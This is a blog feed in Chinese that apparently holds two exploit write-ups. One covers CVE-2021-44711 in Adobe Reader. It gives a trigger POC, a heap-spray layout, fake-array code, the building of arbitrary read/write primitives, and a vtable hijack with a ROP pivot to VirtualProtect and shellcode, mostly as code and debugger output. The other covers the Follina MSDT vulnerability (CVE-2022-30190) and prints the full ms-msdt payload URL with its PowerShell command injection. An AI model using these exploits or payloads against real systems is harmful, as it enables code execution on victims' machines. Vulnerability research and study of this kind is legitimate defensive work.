<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-09-14T20:24:10+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Joey</title><subtitle>Minimal Jekyll theme for storytellers</subtitle><author><name>Chester How</name><email>chesterhow@gmail.com</email></author><entry><title type="html">CVE-2021-44711 Adobe Reader整数溢出漏洞分析与利用</title><link href="http://localhost:4000/2022-09-09/CVE-2021-44711" rel="alternate" type="text/html" title="CVE-2021-44711 Adobe Reader整数溢出漏洞分析与利用" /><published>2022-09-09T00:00:00+08:00</published><updated>2022-09-09T00:00:00+08:00</updated><id>http://localhost:4000/2022-09-09/CVE-2021-44711</id><content type="html" xml:base="http://localhost:4000/2022-09-09/CVE-2021-44711"><![CDATA[<h1 id="前言">前言</h1>

<p>最近看到一篇<a href="https://vul.360.net/archives/434">Adobe Reader 漏洞 CVE-2021-44711 利用浅析</a>漏洞分析文章，打算从该漏洞开始学习PDF类型漏洞的分析与利用，根据文章的分析思路写出EXP。<!--more-->分析使用的软件版本为：<code class="language-plaintext highlighter-rouge">Adobe Acrobat Reader DC 2021.007.20099(x86)</code>。</p>

<h1 id="漏洞分析">漏洞分析</h1>

<p>漏洞通过PDF内嵌的js代码触发，POC代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var _obj = {};
_obj[-1] = null;
var _annot = this.addAnnot({page:0, type:"Line", points:_obj});
</code></pre></div></div>

<p>POC非常简单，关键就在于Annotation 对象的 points属性原本应该由两个点<code class="language-plaintext highlighter-rouge">{[x1,y1],[x2,y2]}</code>组成的，代表Annotation对象直线的起点和终点。然而poc的代码将-1作为下标，在进行类型转换时导致了越界访问造成漏洞。</p>

<p>类型转换函数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//函数偏移：Annots.api+0x32EC6
if ( (int *)v11 != result )
    {
      do
      {
        index_str = (char *)(*(int (__thiscall **)(_DWORD, _DWORD))(dword_22747430 + 0x1C))(
                              *(_DWORD *)(dword_22747430 + 0x1C),
                              *(unsigned __int16 *)(v11 + 0x10));
        index_num = atoi_0(this_1, index_str);  // 转换字符下标为数字下标，将-1转化为0xffffffff
        v26 = 0x30;
        arraysize = v25[1] - *v25;
        HIDWORD(v21) = *v25;
        v22 = index_num;
        if ( arraysize / 0x30 &lt;= index_num )    // 如果数组对象的数量小于当前下标的值，则重新分配数组大小，此时index_num为0xfffffff &gt; 0
          resize(index_num + 1, var_11);   	// 根据下标重新分配数组大小
        sub_2212379A(v11 + 0x18);               // 类型转换
        result = (int *)sub_2212A202(&amp;v23);
        v11 = (int)v23;
      }
      while ( v23 != *v4 );
</code></pre></div></div>

<p>函数首先将字符下标index_str转换为数字下标index_num，随后判断当前下标是否大于目前数组对象的数量（0x30为单个数组对象的大小），如果大于则需要重新分配数组的大小。resize函数接收下标+1代表实际要访问的对象数量，resize函数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unsigned int __thiscall resize(_DWORD *this, unsigned int index, int arg_4)
{
  unsigned int Array_Num; // eax
  int target; // esi

  Array_Num = (this[1] - *this) / 0x30;		//由于Array为空，因此Array_Num=0
  if ( index &gt;= Array_Num )			//此时index为0，而Array_Num=0，因此直接返回当前数组大小为0
  {
    if ( index &gt; Array_Num )                    // 如果当前下标+1大于数组对象的数量，则需要重新分配数组大小
    {
      if ( index &lt;= (this[2] - *this) / 0x30 )
      {
        Array_Num = sub_2216FDF1(this[1], index - Array_Num);// 扩充array的大小符合index+1
        this[1] = Array_Num;
      }
      else
      {
        Array_Num = sub_2216FD0D(this, index, arg_4);// 检查index大于0x5555555时则抛出异常
      }
    }
  }
  else
  {
    target = *this + 0x30 * index;
    Array_Num = sub_2213A435(target, this[1]);
    this[1] = target;
  }
  return Array_Num;
}
</code></pre></div></div>

<p>当index为-1时，由于数组本身为空，因此resize函数中传入的index为0，而Array_Num也为0，因此直接返回了0作为实际的数组大小：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//执行完resize之后，此时ecx为this，即array的指针，eax为返回的resize后数组对象的个数
0:000&gt; dd ecx L4									//array中为空
08d615b8  00000000 00000000 00000000 00000000
0:000&gt; p
eax=00000000 ebx=07074508 ecx=00000000 edx=00000000 esi=08d7b840 edi=08d615b8
eip=6e873049 esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
Annots!PlugInMain+0x15219:
6e873049 8b07            mov     eax,dword ptr [edi]  ds:002b:08d615b8=00000000		//获取array的起始地址
0:000&gt; p
eax=00000000 ebx=07074508 ecx=00000000 edx=00000000 esi=08d7b840 edi=08d615b8
eip=6e87304b esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
Annots!PlugInMain+0x1521b:
6e87304b 8b4dd4          mov     ecx,dword ptr [ebp-2Ch] ss:002b:0034bfdc=ffffffff	//获取index
0:000&gt; 
eax=00000000 ebx=07074508 ecx=ffffffff edx=00000000 esi=08d7b840 edi=08d615b8
eip=6e87304e esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
Annots!PlugInMain+0x1521e:
6e87304e eb03            jmp     Annots!PlugInMain+0x15223 (6e873053)
0:000&gt; p
eax=00000000 ebx=07074508 ecx=ffffffff edx=00000000 esi=08d7b840 edi=08d615b8
eip=6e873053 esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
Annots!PlugInMain+0x15223:
6e873053 6bc930          imul    ecx,ecx,30h	//计算当前下标对象距离array起始地址的大小，index*0x30
0:000&gt; 
eax=00000000 ebx=07074508 ecx=ffffffd0 edx=00000000 esi=08d7b840 edi=08d615b8	
eip=6e873056 esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
Annots!PlugInMain+0x15226:
6e873056 83c618          add     esi,18h		//然而当前index乘0x30后得到0xffffffd0，是个错误的大小
0:000&gt; 
eax=00000000 ebx=07074508 ecx=ffffffd0 edx=00000000 esi=08d7b858 edi=08d615b8
eip=6e873059 esp=0034bfc0 ebp=0034c008 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
Annots!PlugInMain+0x15229:
6e873059 56              push    esi
0:000&gt; 
eax=00000000 ebx=07074508 ecx=ffffffd0 edx=00000000 esi=08d7b858 edi=08d615b8
eip=6e87305a esp=0034bfbc ebp=0034c008 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
Annots!PlugInMain+0x1522a:
6e87305a 03c8            add     ecx,eax	//将array的起始地址加上当前下标对象距离，得到当前下标对象的地址，由于取到错误的大小导致拿到了错误的值
0:000&gt; 
eax=00000000 ebx=07074508 ecx=ffffffd0 edx=00000000 esi=08d7b858 edi=08d615b8
eip=6e87305c esp=0034bfbc ebp=0034c008 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200282
Annots!PlugInMain+0x1522c:
6e87305c e83907ffff      call    Annots!PlugInMain+0x596a (6e86379a)	//调用该函数进行类型转换，传入了错误了对象地址
0:000&gt; 
(f00.92c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=70f6f258 ebx=ffffffd0 ecx=ffffffd0 edx=00000000 esi=00000000 edi=ffffffd0
eip=6e863a2d esp=0034bf5c ebp=0034bf84 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210202
Annots!PlugInMain+0x5bfd:
6e863a2d 833f01          cmp     dword ptr [edi],1    ds:002b:ffffffd0=????????	//函数内部在获取当前下标对象时出现了访问异常
</code></pre></div></div>

<p>最终在执行类型转换函数时获取当前下标对象的地址：*this + index * 0x30时，获取到了错误的值0xffffffd0造成了访问异常。</p>

<h1 id="漏洞利用">漏洞利用</h1>

<p>导致崩溃的原因是因为Annotation 对象的 points属性为空，导致获取目标index对象时直接访问了index * 0x30的地址。因此修改POC如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var _annot = this.addAnnot({page:0, type:"Line"});
var _obj = {};
_obj[2] = 2;
_annot.points = _obj;
_obj[-1] = null;
_annot.points = _obj;
</code></pre></div></div>

<p>下断于resize函数，可以看到此时Array不再为空，大小为0x90：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; pc
eax=00000000 ebx=070616a8 ecx=070d6288 edx=00000000 esi=0706cf38 edi=070d6288
eip=70803044 esp=002fbbe8 ebp=002fbc38 iopl=0         nv up ei pl nz ac po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000213
Annots!PlugInMain+0x15214:
70803044 e83ecc0300      call    Annots!PlugInMain+0x51e57 (7083fc87)	//resize函数
0:000&gt; dd ecx l4				//Array _obj
070d6288  0700d8a0 0700d930 0700d930 00000000
0:000&gt; ? 0700d930 - 0700d8a0 			//Array Size = 0x90
Evaluate expression: 144 = 00000090
</code></pre></div></div>

<p>随后继续执行到类型转换函数，在获取当前下标对象的地址时，由于array不为空能够直接获取到array的起始地址，最终获取的结果正好为_obj[-1]，造成了内存越界访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; P
eax=002fbb78 ebx=070616a8 ecx=ea9f14a7 edx=0000000b esi=0706cf38 edi=070d6288
eip=70803049 esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
Annots!PlugInMain+0x15219:
70803049 8b07            mov     eax,dword ptr [edi]  ds:002b:070d6288=0700d8a0		//获取array的起始地址，此时不为0
0:000&gt; p
eax=0700d8a0 ebx=070616a8 ecx=ea9f14a7 edx=0000000b esi=0706cf38 edi=070d6288
eip=7080304b esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
Annots!PlugInMain+0x1521b:
7080304b 8b4dd4          mov     ecx,dword ptr [ebp-2Ch] ss:002b:002fbc0c=ffffffff	//获取index
0:000&gt; p
eax=0700d8a0 ebx=070616a8 ecx=ffffffff edx=0000000b esi=0706cf38 edi=070d6288
eip=7080304e esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
Annots!PlugInMain+0x1521e:
7080304e eb03            jmp     Annots!PlugInMain+0x15223 (70803053)
0:000&gt; p
eax=0700d8a0 ebx=070616a8 ecx=ffffffff edx=0000000b esi=0706cf38 edi=070d6288
eip=70803053 esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
Annots!PlugInMain+0x15223:
70803053 6bc930          imul    ecx,ecx,30h	//计算当前下标对象距离array起始地址的大小，index*0x30
0:000&gt; p
eax=0700d8a0 ebx=070616a8 ecx=ffffffd0 edx=0000000b esi=0706cf38 edi=070d6288
eip=70803056 esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
Annots!PlugInMain+0x15226:
70803056 83c618          add     esi,18h
0:000&gt; p
eax=0700d8a0 ebx=070616a8 ecx=ffffffd0 edx=0000000b esi=0706cf50 edi=070d6288
eip=70803059 esp=002fbbf0 ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
Annots!PlugInMain+0x15229:
70803059 56              push    esi
0:000&gt; p
eax=0700d8a0 ebx=070616a8 ecx=ffffffd0 edx=0000000b esi=0706cf50 edi=070d6288
eip=7080305a esp=002fbbec ebp=002fbc38 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
Annots!PlugInMain+0x1522a:
7080305a 03c8            add     ecx,eax	//获取当前下标对象的地址为_obj[-1]，即*this - 0x30
0:000&gt; 
eax=0700d8a0 ebx=070616a8 ecx=0700d870 edx=0000000b esi=0706cf50 edi=070d6288
eip=7080305c esp=002fbbec ebp=002fbc38 iopl=0         nv up ei pl nz na po cy
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000203
Annots!PlugInMain+0x1522c:
7080305c e83907ffff      call    Annots!PlugInMain+0x596a (707f379a)	//类型转换函数
0:000&gt; dd ecx L30
//_obj[-1]，该块内存为越界读访问的内容
0700d870  00000000 00000000 00000000 00000000
0700d880  00010000 00000000 00010000 7217beb0
0700d890  0704eea8 80000000 0b758404 88007010
//_obj[0]
0700d8a0  00000000 0055005c 00000000 00000000
0700d8b0  0041005c 006d0064 006e0069 00730069
0700d8c0  00720074 00740061 00000000 0041005c
//_obj[1]
0700d8d0  00000000 00610044 00000000 00000000
0700d8e0  0061006f 0069006d 0067006e 0041005c
0700d8f0  006f0064 00650062 00000000 00720063
//_obj[2]
0700d900  00000000 00740061 00000000 40000000
0700d910  004d0054 006f0044 00730063 0073002e
0700d920  00760061 00760000 00000000 00000000
</code></pre></div></div>

<h2 id="内存越界访问转化为uaf">内存越界访问转化为UAF</h2>

<p>只是内存越界访问无法利用，然而在类型转换函数<code class="language-plaintext highlighter-rouge">sub_2212379A</code>中会根据*this的不同调用不同的转换函数：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220908120809935.png" alt="image-20220908120809935" /></p>

<p>分析这些转换函数后发现*this=0x1a时执行的函数内调用free函数释放了位于*(this+8)的内存：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/image-20220908143515273.png" alt="image-20220908143515273" /></p>

<p>接下来的利用思路就是将内存越界访问转化为UAF，具体的步骤如下：</p>

<ol>
  <li>通过堆喷大小为0x1ffd的Array对象占位稳定的内存地址0x20000048，使得后续漏洞触发释放该块内存</li>
  <li>再次堆喷大小为0x10大小的Array对象布局内存，使得漏洞触发时*this=0x1a，*(this+8) = 0x20000048，漏洞触发后内存地址被释放</li>
</ol>

<p>主要的难点在于如何构造0x10大小的Array对象布局内存，上面的分析可以得出obj对象占用的内存大小为0x90。因此只需要堆喷0x90大小的对象，并制造内存空洞，就可以让_obj对象精确的位于两个精心构造的内存之间：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x00  -&gt;  +---------------------+
          | 	   Array	|
0x90  -&gt;  +---------------------+
          |        free         |  &lt;------ _obj
0x120 -&gt;  +---------------------+
          |        Array        |
0x1b0 -&gt;  +---------------------+
          |        free         |
0x240 -&gt;  +---------------------+
          |        Array        |
0x2d0 -&gt;  +---------------------+
</code></pre></div></div>

<p>因此需要堆喷的0x10大小的Array对象内存布局如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>js:
fakelement = new Array(0x10);
fakelement[11] = 0x1a;
fakelement[12] = 0x20000048;

0:000&gt; dd 07e21608 L26
//fakelement_01
07e21608  00000000 0000000d 00000010 00000010
07e21618  00000000 ffffff84 00000000 ffffff84
07e21628  00000000 ffffff84 00000000 ffffff84
07e21638  00000000 ffffff84 00000000 ffffff84
07e21648  00000000 ffffff84 00000000 ffffff84
07e21658  00000000 ffffff84 00000000 ffffff84
07e21668  00000000 ffffff84 0000001a ffffff81
07e21678  20000048 ffffff81 00000000 00000000
07e21688  00000000 00000000 00000000 00000000
07e21698  62334f4b 88000000
//fakelement_02
0:000&gt; dd 07e216a0  L26
07e216a0  00000000 0000000d 00000010 00000010
07e216b0  00000000 ffffff84 00000000 ffffff84
07e216c0  00000000 ffffff84 00000000 ffffff84
07e216d0  00000000 ffffff84 00000000 ffffff84
07e216e0  00000000 ffffff84 00000000 ffffff84
07e216f0  00000000 ffffff84 00000000 ffffff84
07e21700  00000000 ffffff84 0000001a ffffff81
07e21710  20000048 ffffff81 00000000 00000000
07e21720  00000000 00000000 00000000 00000000
07e21730  62334f7e 88000000
</code></pre></div></div>

<p>从相邻的Array对象内存布局可以看出每个Array对象以8个字节的数据隔开，因此当_obj占位于被释放的Array对象时，_obj[-1]正好访问的是上一个Array对象的0x1a：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; dd 06e19250 - 0x30 L30
//_obj[-1]
06e19220  0000001a ffffff81 20000048 ffffff81
06e19230  00000000 00000000 00000000 00000000
06e19240  00000000 00000000 2922eb66 88000000
//_obj[0]
06e19250  00000000 0000000d 00000000 00000000
06e19260  00000000 ffffff84 00000000 ffffff84
06e19270  00000000 ffffff84 00000000 ffffff84
06e19280  00000000 ffffff84 00000000 00000000
06e19290  00000000 ffffff84 00000000 ffffff84
06e192a0  00000000 ffffff84 00000000 ffffff84
06e192b0  00000000 ffffff84 00000000 40000000
06e192c0  20000048 ffffff81 00000000 00000000
06e192d0  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>接着执行类型转换的函数可以看到当前this指针正好指向_obj[-1]，下断在free函数，传入的参数正是0x20000048：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; g
Breakpoint 1 hit
eax=0015c0d4 ebx=06e19220 ecx=06e19220 edx=06e19220 esi=00000000 edi=06e19220
eip=705e89d1 esp=0015c0c4 ebp=0015c0f4 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
Annots!PlugInMain+0xaba1:
705e89d1 55              push    ebp
0:000&gt; dd ecx Lc
06e19220  0000001a ffffff81 20000048 ffffff81
06e19230  00000000 00000000 00000000 00000000
06e19240  00000000 00000000 2922eb66 88000000
0:000&gt; g
eax=20000048 ebx=06e19220 ecx=06e19220 edx=0000001a esi=00000000 edi=0015c0d4
eip=7436f7e0 esp=0015bf8c ebp=0015bf94 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
ucrtbase!free:
7436f7e0 8bff            mov     edi,edi
0:000&gt; dps esp L2
0015bf8c  705dd041 Annots+0x1d041
0015bf90  20000048		//free的内存地址
</code></pre></div></div>

<p>到这一步，漏洞已经从越界内存访问转变为了UAF，剩下的就是利用释放的内存构造读写原语了。</p>

<h2 id="任意内存读写原语的构造">任意内存读写原语的构造</h2>

<p>目前已经有一个被释放的0x1ffe大小的Array对象，因此用0xffe8大小的ArrayBuffer对象占位同一块内存。由于Array对象和ArrayBuffer对象表示长度属性的内存在同一位置，这样就导致了Array对象的长度被扩展为0xffe8，因此能够越界读写下一个临近Array对象的length值了：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; dd 20000048 L10		//Array对象初始长度为0x1ffd
20000048  00000000 00001ffd 00001ffd 00001ffd
20000058  00000000 ffffff81 00000000 ffffff81
20000068  00000000 ffffff81 00000000 ffffff81
20000078  00000000 ffffff81 00000000 ffffff81
0:000&gt; dd 20000048 L10		//内存占用后长度为0xffe8
20000048  00000000 0000ffe8 07631450 00000000
20000058  41414141 ffffff81 00000000 00000000
20000068  00000000 00000000 00000000 00000000
20000078  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>但是Array对象读写内存的能力不如ArrayBuffer，于是释放掉下一个临近的Array对象，并用ArrayBuffer对象占用内存，随后利用越界读写的Array对象修改ArrayBuffer对象的长度为0xffffff81：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:018&gt; dd 20000048+0x10000 L10
20010048  00000000 ffffff81 091910e0 00000000
20010058  41414141 ffffff81 00000000 00000000
20010068  00000000 00000000 00000000 00000000
20010078  00000000 00000000 00000000 00000000
</code></pre></div></div>

<p>至此就获得了长度为0xffffff81的任意地址读写原语，不过该ArrayBuffer的起始地址为0x20010058，如果需要读写起始地址之前的数据，则必须将目的地址 + 0xffffffff + 1，得到的值再通过读写原语进行读写就可以成功写入了。</p>

<h2 id="代码执行">代码执行</h2>

<p>有了任意内存读写原语后，接下来就可以获取函数地址构造ROP链了。构造好后需要劫持对象的虚表实现，步骤如下：</p>

<ol>
  <li>获取任意内存读写原语的虚表地址</li>
  <li>修改虚表地址为ROP指令，进行栈置换</li>
  <li>修改shellcode内存属性为可读可写可执行</li>
  <li>跳转到shellcode执行，完成利用</li>
</ol>

<p>读写原语的虚表地址可以通过对象头的信息获取：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:014&gt; dd 20010048 L10
20010048  00000000 ffffff81 076910e0 00000000
20010058  41414141 ffffff81 00000000 00000000
20010068  00000000 00000000 00000000 00000000
20010078  00000000 00000000 00000000 00000000
0:014&gt; dps 076910e0 L4
076910e0  07627448
076910e4  07625ac0
076910e8  00000000
076910ec  674d9540 EScript!double_conversion::DoubleToStringConverter::kBase10MaximalLength+0xae630
0:014&gt; dps 07627448 L4
07627448  0763f628
0762744c  00000004
07627450  3affffff
07627454  00000040
0:014&gt; dps 0763f628 L4
0763f628  674d45e8 EScript!double_conversion::DoubleToStringConverter::kBase10MaximalLength+0xa96d8
0763f62c  07628090
0763f630  00000000
0763f634  06893c18
0:014&gt; dps 674d45e8 L8	//读写原语虚表
674d45e8  67429e18 EScript!double_conversion::DoubleToStringConverter::ToPrecision+0x3a0a8
674d45ec  9c000521
674d45f0  6727ad70 EScript!mozilla::HashBytes+0x9020
674d45f4  67363bb0 EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x9b870
674d45f8  6727ad70 EScript!mozilla::HashBytes+0x9020	//只需要修改该处的地址为ROP指令地址，即可实现虚表劫持
674d45fc  6727ad70 EScript!mozilla::HashBytes+0x9020
674d4600  6727ad70 EScript!mozilla::HashBytes+0x9020
674d4604  6727ad70 EScript!mozilla::HashBytes+0x9020
</code></pre></div></div>

<p>ROP指令则可以选择EScript+0x10539d处的指令，将栈地址迁移到0x5d000001。只需要在0x5d000001处填写好VirtualProtect的函数地址和对应的参数即可修改shellcode的内存属性为可执行，并跳转到shellcode执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:013&gt; g
Breakpoint 0 hit
eax=06d54ea0 ebx=00000000 ecx=6712539d edx=6712539d esi=0034c4c0 edi=06dfe0e8
eip=6712539d esp=0034c3f8 ebp=0034c488 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x9d05d:
6712539d bc0100005d      mov     esp,5D000001h
0:000&gt; p
eax=06d54ea0 ebx=00000000 ecx=6712539d edx=6712539d esi=0034c4c0 edi=06dfe0e8
eip=671253a2 esp=5d000001 ebp=0034c488 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x9d062:
671253a2 c3              ret
0:000&gt; dps esp L6
5d000001  75bd435f kernel32!VirtualProtect
5d000005  20010070 //shellcode
5d000009  20010058 
5d00000d  00000700
5d000011  00000040
5d000015  2001006c
</code></pre></div></div>

<p>不过在执行shellcode时发现普通的shellcode调用WinExec会执行失败，调试后发现执行到ZwCreateUserProcess时参数内有堆喷的垃圾数据，怀疑因为这些数据导致执行失败，更换shellcode为syscall执行ZwCreateUserProcess后成功调用。</p>

<p>该代码执行方式无法绕过CFG，最终在Windows7上完成了漏洞利用：</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/44711.gif" alt="" /></p>

<h1 id="总结">总结</h1>

<p>该漏洞利用难点在于如何将漏洞从越界内存访问转化为UAF，后续的利用过程和其他同类型漏洞大同小异。在利用过程中也得到了文章作者李双师傅的帮助，学习到了Adobe漏洞的利用技巧。</p>]]></content><author><name>Joey</name></author><category term="漏洞利用" /><summary type="html"><![CDATA[前言 最近看到一篇Adobe Reader 漏洞 CVE-2021-44711 利用浅析漏洞分析文章，打算从该漏洞开始学习PDF类型漏洞的分析与利用，根据文章的分析思路写出EXP。]]></summary></entry><entry><title type="html">微软MSDT远程代码执行漏洞 CVE-2022-30190 分析</title><link href="http://localhost:4000/2022-06-10/CVE-2022-30190" rel="alternate" type="text/html" title="微软MSDT远程代码执行漏洞 CVE-2022-30190 分析" /><published>2022-06-10T00:00:00+08:00</published><updated>2022-06-10T00:00:00+08:00</updated><id>http://localhost:4000/2022-06-10/CVE-2022-30190</id><content type="html" xml:base="http://localhost:4000/2022-06-10/CVE-2022-30190"><![CDATA[<h1 id="前言">前言</h1>

<p>在分析漏洞的过程中，陆陆续续看到许多师傅的分析文章，于是参考之后结合自己的分析总结了一下。<!--more--></p>

<h1 id="漏洞简介">漏洞简介</h1>

<p>近日，微软官方网站发布了Microsoft Office MSDT（Microsoft Support Diagnostic Tool）远程代码执行漏洞通告，漏洞编号CVE-2022-30190，目前在开源代码平台已存在该漏洞的验证代码。该通告指出，<strong>Microsoft Office MSDT存在远程代码执行漏洞，攻击者可利用Office文件中的远程模板功能，访问远程服务器上挂载的恶意HTML文件，之后通过 ‘ms-msdt’ URI来执行恶意PowerShell代码</strong>。</p>

<p>值得注意的是该漏洞在宏被禁用的情况下仍可被利用。<strong>并且当恶意文件另存为RTF格式时，还可以通过Windows资源管理器中的预览窗格触发此漏洞的调用，无需执行也可以在目标机器上执行任意代码。</strong>该漏洞影响范围非常广泛，目前官方未发布修复补丁。</p>

<h1 id="漏洞利用链">漏洞利用链</h1>

<h2 id="样本执行流程">样本执行流程</h2>

<p><strong>1. 攻击者利用Office文件中的远程模板功能加载远程的poc.html</strong></p>

<p>在document.xml.rels文件中可以看到docx文件嵌入了一个ole对象，指向了poc.html</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_11-45-45.png" alt="Snipaste_2022-06-06_11-45-45" /></p>

<hr />

<p><strong>2.poc.html通过 ‘ms-msdt’ URL使得Office执行msdt.exe，并将构造好的命令行参数传入msdt.exe</strong></p>

<p>查看poc.html的内容，可以看到页面访问了URL：<code class="language-plaintext highlighter-rouge">ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \"</code></p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_11-56-48.png" alt="Snipaste_2022-06-06_11-56-48" /></p>

<p>上述注释是为了填充HTML页面使其大小大于4kb，只有大于4kb的HTML页面word才会解析该页面进而触发漏洞，具体原因在<a href="https://billdemirkapi.me/unpacking-cve-2021-40444-microsoft-office-rce/">Unpacking CVE-2021-40444: A Deep Technical Analysis of an Office RCE Exploit</a>这篇文章中已经分析的很清楚了。</p>

<p>使用urlprotocolview查看<strong>ms-msdt</strong> URL对应的二进制文件正是msdt.exe</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_11-40-32.png" alt="Snipaste_2022-06-06_11-40-32" /></p>

<p>winword.exe解析该URL后会调用msdt.exe，并将命令行参数传入</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_12-44-35.png" alt="Snipaste_2022-06-06_12-44-35" /></p>

<hr />

<p><strong>3.msdt.exe接收命令行参数后触发漏洞执行powershell命令：<code class="language-plaintext highlighter-rouge">IEX('calc.exe')</code>，调用了calc.exe</strong></p>

<p>因为直接打开msdt.exe需要输入技术支持人员密钥才能进行下一步诊断，通过参数<code class="language-plaintext highlighter-rouge">/id PCWDiagnostic</code>运行PCWDiagnostic程序兼容性诊断包绕过了该步骤</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-06_13-26-12.png" alt="Snipaste_2022-06-06_13-26-12" /></p>

<p>然而只是绕过输入密钥还不够，还需要点击下一页，才可以接收参数执行进程，通过参数<code class="language-plaintext highlighter-rouge">/skip force </code>绕过了该步骤，此时msdt会创建并启动服务，通过svchost.exe创建进程sdiagnhost.exe</p>

<p><img src="https://blog-1257303866.cos.ap-guangzhou.myqcloud.com/img/Snipaste_2022-06-08_11-08-59.png" alt="Snipaste_2022-06-08_11-08-59" /></p>

<p>接着再输入<code class="language-plaintext highlighter-rouge">/param "IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"</code>就能通过sdiagnhost.exe执行powershell命令，整个漏洞利用完成。</p>

